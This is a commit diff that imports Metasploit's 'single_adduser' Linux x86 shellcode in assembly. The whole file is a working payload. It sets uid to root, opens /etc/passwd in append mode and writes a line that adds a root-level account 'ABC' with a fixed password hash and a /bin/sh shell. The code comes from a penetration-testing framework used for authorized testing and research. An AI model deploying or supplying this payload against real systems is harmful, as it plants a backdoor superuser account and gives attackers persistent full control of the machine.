db98296641516110c9a1b2a29d7be6a056c7af6f
no_author <no_author@no_author>
2004-11-13 00:08:14 +0000

    Initial import of assembly sources for linx86_adduser

---
+++ src/shellcode/linux/ia32/single_adduser.asm
@@ -0,0 +1,55 @@
+;;
+;
+;        Name: single_adduser
+;   Platforms: Linux
+;     Authors: vlad902 <vlad902 [at] gmail.com>
+;     Authors: spoonm <ninjatools [at] hush.com>
+;     Authors: skape <mmiller [at] hick.org>
+;     Version: $Revision$
+;     License:
+;
+;        This file is part of the Metasploit Exploit Framework
+;        and is subject to the same licenses and copyrights as
+;        the rest of this package.
+;
+; Description:
+;
+;        Add a line to /etc/passwd.
+;
+;;
+
+
+BITS 32
+global _start
+
+%include "generic.asm"
+
+_start:
+  setreuid 0
+
+  push  byte 0x05
+  pop   eax
+
+  xor   ecx, ecx
+  push  ecx
+  push  dword 0x64777373
+  push  dword 0x61702f2f
+  push  dword 0x6374652f
+  mov   ebx, esp
+  inc   ecx
+  mov   ch, 0x04
+  int   0x80
+
+  xchg  eax, ebx
+  call  getstr
+db "ABC:AAnV3m35vbc/g:0:0::/:/bin/sh"
+getstr:
+  pop   ecx
+  mov   edx, [ecx-4]
+  push  byte 0x04
+  pop   eax
+  int   0x80
+
+  push  byte 0x01
+  pop   eax
+  int   0x80
